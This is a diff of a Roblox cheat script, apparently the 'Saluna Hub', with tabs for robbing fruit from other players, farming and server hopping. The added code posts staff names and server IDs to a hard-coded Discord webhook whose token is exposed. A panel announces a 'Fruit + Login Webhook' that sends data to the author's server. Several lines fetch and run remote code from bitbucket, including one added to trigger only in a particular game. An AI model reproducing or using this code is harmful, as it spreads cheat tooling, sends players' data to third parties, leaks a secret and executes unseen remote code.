@@ -179,6 +179,28 @@ for _, v in pairs(game:GetService("Players"):GetPlayers()) do
     for _, v1 in pairs(Pedo) do
         if v.UserId == v1 then
             game:GetService("Players").LocalPlayer:Kick("Admin or Staff is in the server")
+task.wait()
+local url = "https://discord.com/api/webhooks/1268351413751120002/YX_I7VpV7ECm8bAE8cjyhyBUix9GjZMO4QLmZhdjAEn2HPORUc4L5cEA99sHiNKpMS1r"
+        local data = {
+        ["content"] = "@everyone",
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\n Admin or Staff: " .. v.Name .. "\nIs Online" .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId,
+                ["type"] = "rich",
+                ["color"] = tonumber(0xff8200),
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+
         end
     end
 end
@@ -187,6 +209,27 @@ game:GetService("Players").PlayerAdded:Connect(function(r)
     for _, v in pairs(Pedo) do
         if r.UserId == v then
             game:GetService("Players").LocalPlayer:Kick("Admin or Staff has joined the server")
+task.wait()
+local url = "https://discord.com/api/webhooks/1268351413751120002/YX_I7VpV7ECm8bAE8cjyhyBUix9GjZMO4QLmZhdjAEn2HPORUc4L5cEA99sHiNKpMS1r"
+        local data = {
+        ["content"] = "@everyone",
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\n Admin or Staff: " .. r.Name .. "\nIs Online" .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId,
+                ["type"] = "rich",
+                ["color"] = tonumber(0xff8200),
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
         end
     end
 end)  
@@ -314,6 +357,18 @@ end)
     nonet = Window:AddTab({ Title = " ", Icon = "" })
 }
 Options = Fluent.Options
+
+game.CoreGui:FindFirstChild("ScreenGui").Name = "SalunaFluent"
+
+Tabs.Webhook:AddSection("Webhook")
+
+Tabs.Webhook:AddParagraph({
+Title = "Fruit + Login Webhook",
+Content = [[Webhook Will Be Sent To Saluna's Discord Server.
+Come join us.
+https://discord.gg/ecpbhm8G3w
+]]
+})
 
 Tabs.Robbing:AddSection("Fruit Robbing")
 Tabs.Robbing:AddParagraph({
@@ -489,7 +544,6 @@ loadstring(game:HttpGet("https://bitbucket.org/hehehezz/hellowz/raw/6f5eb318bb16
         end
     })
 
-Tabs.Misc:AddSection("                                      ---")
     Tabs.Misc:AddButton({
         Title = "Nothing Hub",
         Description = "Open Nothing Hub Script",
@@ -608,8 +662,7 @@ end
 
 Tabs.Player:AddSection("About Player")
 
-plrts =
-Tabs.Player:AddInput("plrts", {
+plrts = Tabs.Player:AddInput("plrts", {
 	Title = "Choose Player:",
 	Default = "",
 	Placeholder = "Insert Here",
@@ -1460,19 +1513,18 @@ drinkstype = Tabs.Shop:AddDropdown("banlongdiem", {
 _G.drinktret = tostring(typepp)
 end)
 
-    drinkamount = Tabs.Shop:AddInput("drinkamount", {
-        Title = "Choose Amount:",
-        Default = "",
-        Placeholder = "Insert Here",
-        Numeric = true, -- Only allows numbers
-        Finished = true, -- Only calls callback when you press enter
-        Callback = function()
-        end
-    })
-
-    drinkamount:OnChanged(function()
-drinkff = drinkamount.Value
-tretgmm = tonumber(drinkff)
+drinkamount = Tabs.Shop:AddInput("drinkamount", {
+	Title = "Choose Amount:",
+	Default = "",
+	Placeholder = "Insert Here",
+	Numeric = true, -- Only allows numbers
+	Finished = false, -- Only calls callback when you press enter
+	Callback = function()
+	end
+})
+drinkamount:OnChanged(function()
+task.wait()
+tretgmm = tonumber(drinkamount.Value)
 end)
 
 Tabs.Shop:AddButton({
@@ -3849,23 +3901,30 @@ else
 _G.farmadvanced = false
 end
 end)
+Tabs.Server:AddSection("Join Server With JobID")
 
-
-Tabs.Server:AddSection("Discord")
-Tabs.Server:AddParagraph({
-Title = "Discord Information",
-Content = "Discord Invite Link: https://discord.gg/ecpbhm8G3w"
+joinjobid = Tabs.Server:AddInput("joinjobid", {
+	Title = "Server JobID:",
+	Default = "",
+	Placeholder = "Insert Here",
+	Numeric = false, -- Only allows numbers
+	Finished = false, -- Only calls callback when you press enter
+	Callback = function()
+	end
 })
+joinjobid:OnChanged(function()
+task.wait()
+targetjobid = tostring(joinjobid.Value)
+end)
 
-Tabs.Server:AddButton({
-        Title = "Discord Saluna Hub",
-        Description = "Copy Discord Invite Link",
+    Tabs.Server:AddButton({
+        Title = "Join Server",
+        Description = "Join The Targeted Server With JobID",
         Callback = function()
-toClipboard("https://discord.gg/ecpbhm8G3w")    
-end
+game.Players.LocalPlayer:Kick("Joining Server, Please Wait...")
+game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, targetjobid, game.Players.LocalPlayer)
+        end
     })
-
-
 
 Tabs.Server:AddSection("Rejoin/Hop")
     Tabs.Server:AddButton({
@@ -4105,6 +4164,20 @@ end
 })
 end
 })
+
+Tabs.Server:AddSection("Discord")
+Tabs.Server:AddParagraph({
+Title = "Discord Information",
+Content = "Discord Invite Link: https://discord.gg/ecpbhm8G3w"
+})
+
+Tabs.Server:AddButton({
+        Title = "Discord Saluna Hub",
+        Description = "Copy Discord Invite Link",
+        Callback = function()
+toClipboard("https://discord.gg/ecpbhm8G3w")    
+end
+    })
 
 Tabs.Affinity:AddSection("Roll Affinity 1st Devil Fruit")
 
@@ -5345,19 +5418,19 @@ end)
 spawn(function()
 while wait(0.3) do
 repeat wait() until _G.storeffrt == true
-repeat task.wait()
 pcall(function()
-for _, v in pairs(Rarefruit) do
-if game.Players.LocalPlayer.Backpack:FindFirstChild(v) then
-repeat
-game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild(v))
+repeat task.wait()
+for i, t in pairs(Rarefruit) do
+for i, u in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+if u.Name == t then
+game.Players.LocalPlayer.Character.Humanoid:EquipTool(u)
 task.wait()
 storedf()
-until x.Parent ~= game.Players.LocalPlayer.Character
 end
 end
-end)
+end
 until not _G.storeffrt
+end)
 end
 end)
 
@@ -5365,21 +5438,17 @@ end)
 spawn(function()
 while wait(0.3) do
 repeat wait() until _G.aurasto == true
-repeat task.wait()
 pcall(function()
+repeat task.wait()
 for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-if string.find(v.Name,"Fruit") then
-if string.sub(v.Data.Value,tonumber(string.len(v.Data.Value)) - 1) == ",1" then
-repeat
-game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild(v))
+if string.find(v.Name,"Fruit") and string.sub(v.Data.Value,tonumber(string.len(v.Data.Value)) - 1) == ",1" then
+game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
 task.wait()
 storedf()
-until x.Parent ~= game.Players.LocalPlayer.Character
 end
 end
-end
-end)
 until not _G.aurasto
+end)
 end
 end)
 
@@ -6640,3 +6709,7 @@ end)
 end
 end
 end)
+
+if game.placeId == 3237168 then
+loadstring(game:HttpGet('https://bitbucket.org/hehehezz/hellowz/raw/b269d1380b009408777046cedb279734f3762aac/frzxhoo.lua'))()
+end
